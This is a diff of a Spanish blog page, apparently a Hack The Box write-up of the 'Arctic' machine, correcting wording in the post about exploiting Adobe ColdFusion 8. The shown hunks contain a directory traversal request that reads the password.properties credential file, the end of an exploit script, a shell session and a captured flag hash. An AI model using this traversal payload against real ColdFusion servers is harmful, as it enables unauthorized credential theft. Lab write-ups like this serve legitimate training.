@@ -14,8 +14,8 @@
 <meta property="og:title" content="Maquina Arctic - htb writeup" />
 <meta name="author" content="Firtsmiracle" />
 <meta property="og:locale" content="en_US" />
-<meta name="description" content="El dia de hoy vamos a estar resolviendo la maquina Arctic de hackthebox que es una maquina Windows de dificultad Facil. Para explotar esta maquina abusaremos una vulnerabilidad de Condfusion 8 que nos permitira realizar un directory path traversal y una vez conectados al Coldfusion nos arovecharemos de una funcionalidad que tiene para extraer una credencial y crearemos un archivo jsp malicioso para ganar acceso al sistema y finalmente para escalar privilegios como el usuario administrator nos aprovecharemos del privilegio Seimpersonateprivilege." />
-<meta property="og:description" content="El dia de hoy vamos a estar resolviendo la maquina Arctic de hackthebox que es una maquina Windows de dificultad Facil. Para explotar esta maquina abusaremos una vulnerabilidad de Condfusion 8 que nos permitira realizar un directory path traversal y una vez conectados al Coldfusion nos arovecharemos de una funcionalidad que tiene para extraer una credencial y crearemos un archivo jsp malicioso para ganar acceso al sistema y finalmente para escalar privilegios como el usuario administrator nos aprovecharemos del privilegio Seimpersonateprivilege." />
+<meta name="description" content="El dia de hoy vamos a estar resolviendo la maquina Arctic de hackthebox que es una maquina Windows de dificultad Facil. Para explotar esta maquina abusaremos una vulnerabilidad de Adobe Coldfusion 8 que nos permitira realizar un directory path traversal y una vez conectados al Coldfusion nos arovecharemos de una funcionalidad que tiene para extraer una credencial y crearemos un archivo jsp malicioso para ganar acceso al sistema y finalmente para escalar privilegios como el usuario administrator nos aprovecharemos del privilegio Seimpersonateprivilege." />
+<meta property="og:description" content="El dia de hoy vamos a estar resolviendo la maquina Arctic de hackthebox que es una maquina Windows de dificultad Facil. Para explotar esta maquina abusaremos una vulnerabilidad de Adobe Coldfusion 8 que nos permitira realizar un directory path traversal y una vez conectados al Coldfusion nos arovecharemos de una funcionalidad que tiene para extraer una credencial y crearemos un archivo jsp malicioso para ganar acceso al sistema y finalmente para escalar privilegios como el usuario administrator nos aprovecharemos del privilegio Seimpersonateprivilege." />
 <link rel="canonical" href="http://localhost:4000/hackthebox/htb-writeup-Arctic" />
 <meta property="og:url" content="http://localhost:4000/hackthebox/htb-writeup-Arctic" />
 <meta property="og:site_name" content="Firtsmiracle blog" />
@@ -26,7 +26,7 @@
 <meta property="twitter:image" content="http://localhost:4000/assets/images/HTB/htb-writeup-Arctic/arctic.png" />
 <meta property="twitter:title" content="Maquina Arctic - htb writeup" />
 <script type="application/ld+json">
-{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Firtsmiracle"},"dateModified":"2023-04-11T00:00:00+00:00","datePublished":"2023-04-11T00:00:00+00:00","description":"El dia de hoy vamos a estar resolviendo la maquina Arctic de hackthebox que es una maquina Windows de dificultad Facil. Para explotar esta maquina abusaremos una vulnerabilidad de Condfusion 8 que nos permitira realizar un directory path traversal y una vez conectados al Coldfusion nos arovecharemos de una funcionalidad que tiene para extraer una credencial y crearemos un archivo jsp malicioso para ganar acceso al sistema y finalmente para escalar privilegios como el usuario administrator nos aprovecharemos del privilegio Seimpersonateprivilege.","headline":"Maquina Arctic - htb writeup","image":"http://localhost:4000/assets/images/HTB/htb-writeup-Arctic/arctic.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hackthebox/htb-writeup-Arctic"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/images/piece.png"},"name":"Firtsmiracle"},"url":"http://localhost:4000/hackthebox/htb-writeup-Arctic"}</script>
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Firtsmiracle"},"dateModified":"2023-04-11T00:00:00+00:00","datePublished":"2023-04-11T00:00:00+00:00","description":"El dia de hoy vamos a estar resolviendo la maquina Arctic de hackthebox que es una maquina Windows de dificultad Facil. Para explotar esta maquina abusaremos una vulnerabilidad de Adobe Coldfusion 8 que nos permitira realizar un directory path traversal y una vez conectados al Coldfusion nos arovecharemos de una funcionalidad que tiene para extraer una credencial y crearemos un archivo jsp malicioso para ganar acceso al sistema y finalmente para escalar privilegios como el usuario administrator nos aprovecharemos del privilegio Seimpersonateprivilege.","headline":"Maquina Arctic - htb writeup","image":"http://localhost:4000/assets/images/HTB/htb-writeup-Arctic/arctic.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hackthebox/htb-writeup-Arctic"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/images/piece.png"},"name":"Firtsmiracle"},"url":"http://localhost:4000/hackthebox/htb-writeup-Arctic"}</script>
 <!-- End Jekyll SEO tag -->
 
 
@@ -159,7 +159,7 @@
     <!-- Toc if any -->
     
     <!-- End Toc -->
-    <p>El dia de hoy vamos a estar resolviendo la maquina <code>Arctic</code> de <code>hackthebox</code> que es una maquina <code>Windows</code> de dificultad <code>Facil</code>. Para explotar esta maquina abusaremos una vulnerabilidad de <code>Condfusion 8</code> que nos permitira realizar un <code>directory path traversal</code> y una vez conectados al <code>Coldfusion</code> nos arovecharemos de una funcionalidad que tiene para extraer una credencial y crearemos un archivo <code>jsp</code> malicioso para ganar acceso al sistema y finalmente para escalar privilegios como el usuario <code>administrator</code> nos aprovecharemos del privilegio <code>Seimpersonateprivilege</code>.</p>
+    <p>El dia de hoy vamos a estar resolviendo la maquina <code>Arctic</code> de <code>hackthebox</code> que es una maquina <code>Windows</code> de dificultad <code>Facil</code>. Para explotar esta maquina abusaremos una vulnerabilidad de <code>Adobe Coldfusion 8</code> que nos permitira realizar un <code>directory path traversal</code> y una vez conectados al <code>Coldfusion</code> nos arovecharemos de una funcionalidad que tiene para extraer una credencial y crearemos un archivo <code>jsp</code> malicioso para ganar acceso al sistema y finalmente para escalar privilegios como el usuario <code>administrator</code> nos aprovecharemos del privilegio <code>Seimpersonateprivilege</code>.</p>
 
 <p>Vamos a comenzar como siempre creando un directorio con el nombre de la maquina:</p>
 
@@ -412,8 +412,7 @@ if __name__ == '__main__':
     main()
 </code></pre>
 
-<p>Podemos ver que esta realizando una petición a <code>http://server/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en
-</code> para extraer un archivo local.</p>
+<p>Podemos ver que esta realizando una petición a <code>http://server/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en</code> para extraer un archivo local.</p>
 
 <p>Hagamos eso entonces y en el navegador agreguemos esa petición.</p>
 
@@ -522,29 +521,19 @@ whoami
 whoami
 arctic\tolis
 </code></pre>
-<p>Si ahora nos vamos a la raiz del sistema y buscamos la primera flag de forma recursiva, vemos que se encuentra en el direcotrio personal del usuario, la leemos y habriamos obtenido la primera flag <code>user.txt</code></p>
 
-<pre><code class="language-cmd">cd C:\
-cd C:\
+<p>Si ahora nos vamos al directorio personal del usuario <code>tolis</code>, podemos leer la primera flag <code>user.txt</code></p>
 
-dir /r /s user.txt
-dir /r /s user.txt
- Volume in drive C has no label.
- Volume Serial Number is 5C03-76A8
+<pre><code class="language-cmd">cd C:\Users\tolis\Desktop
+cd C:\Users\tolis\Desktop
 
- Directory of C:\Users\tolis\Desktop
-
-13/04/2023  02:35                 34 user.txt
-               1 File(s)             34 bytes
-
-     Total Files Listed:
-               1 File(s)             34 bytes
-               0 Dir(s)   1.434.173.440 bytes free
-
-type C:\Users\tolis\Desktop\user.txt
-type C:\Users\tolis\Desktop\user.txt
+type user.txt
+type user.txt
 b2d38d2f34b46b4189d147c805813fa4
+
+C:\Users\tolis\Desktop&gt;
 </code></pre>
+
 <h2 id="escalada-de-privilegios">Escalada de Privilegios <a href="#escalada-de-privilegios">#</a></h2>
 
 <p>Veamos que privilegios tenemos como el usuario <code>tolis</code>, para ello usaremos el comando <code>whoami /priv</code></p>
